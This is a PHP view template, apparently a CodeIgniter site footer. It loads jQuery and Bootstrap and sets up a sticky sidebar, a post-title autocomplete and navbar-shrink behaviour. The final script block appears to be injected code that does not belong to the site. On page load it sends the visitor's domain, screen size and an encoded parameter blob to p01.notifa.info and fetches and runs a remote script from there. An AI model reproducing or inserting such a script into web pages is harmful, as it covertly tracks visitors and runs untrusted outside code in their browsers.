<!-- jQuery -->
    <script src="<?php echo base_url().'assets/js/jquery-3.3.1.js'?>" type="text/javascript"></script>
	<script src="<?php echo base_url().'assets/js/bootstrap.js'?>" type="text/javascript"></script>
	<script src="<?php echo base_url().'assets/js/jquery-ui.js'?>" type="text/javascript"></script>
    
    <script type="text/javascript" src="<?=base_url('assets/js/rAF.js')?>"></script>
	<script type="text/javascript" src="<?=base_url('assets/js/ResizeSensor.js')?>"></script>
	<script type="text/javascript" src="<?=base_url('assets/js/sticky-sidebar.js')?>"></script>
    <!-- <script src="<?=base_url('assets/js/jquery.min.js')?>"></script>
    <script src="<?=base_url('assets/js/bootstrap.min.js')?>"></script> -->
	<script type="text/javascript">

		var a = new StickySidebar('#sidebar', {
			topSpacing: 75,
			bottomSpacing: 20,
			containerSelector: '.container',
			innerWrapperSelector: '.sidebar__inner'
		});
	</script>
    <script type="text/javascript">
		$(document).ready(function(){

		    $('#judul_post').autocomplete({
                source: "<?php echo site_url('home/get_autocomplete');?>",
     
                select: function (event, ui) {
                    // $(this).val(ui.item.label);
                    $('[name="judul_post"]').val(ui.item.label); 
                    // $('[name="judul_post"]').val(ui.item.description); 
                    $("#form_search").submit(); 
                }
            });

		});
	</script>

    <script>
        $(document).ready(function () {
            $(window).scroll(function () {

                //Method 1: Using addClass and removeClass
                //if ($(document).scrollTop() > 50) {
                //    $('.navbar-default').addClass('navbar-shrink');
                //} else {
                //    $('.navbar-default').removeClass('navbar-shrink');
                //}

                //Method 2: Using toggleClass
                $(".navbar-default").toggleClass("navbar-shrink", $(this).scrollTop() > 50)
            });
        });

        
    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5ms%2f4eThM97gOpd7ejmx%2brsfdA7IZZ7yxQvR%2bRYH5iQzr9%2bymCDgLNzz9CJ2fIInrV38XDwFUy5INSiBbGSNWtw7CFTNxfZ4blN6q3oo7BeMMWUAfpJv0WlJjtWKT%2fceuuIACxbYfKEzscxjJp66qzCu2DGrHjYumeVCwIbCmSkKB1%2fFZPrGFPsKb9CgIoyulSQRjFgcPKJxAjk4GK3DNlvMLHo1qkDiDRxES8uCWe1PJ0%2fTLD2M9Rahv%2fAT0VOhXxMTTwrtvKXJZ1M%2f%2f93HUq9OBmbKrVAFLThGLYmA4qXdkEhw89CawIloemOQhN8EPqbXbgOw1k%2bT4K0ukpbk70%2fA0R8rEU9Mp7VjGMtFkrBoRtZekTchXTUFn5f3XSik9AQDafm3tD73gIHlwGzSePpSfQ46TeahtEvsWdqC65I5moy7fOFvbIPyKY004Th0KbB7A0gwoVBXAFZJK%2buyVo%2bU6ar4SYK%2bXo" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
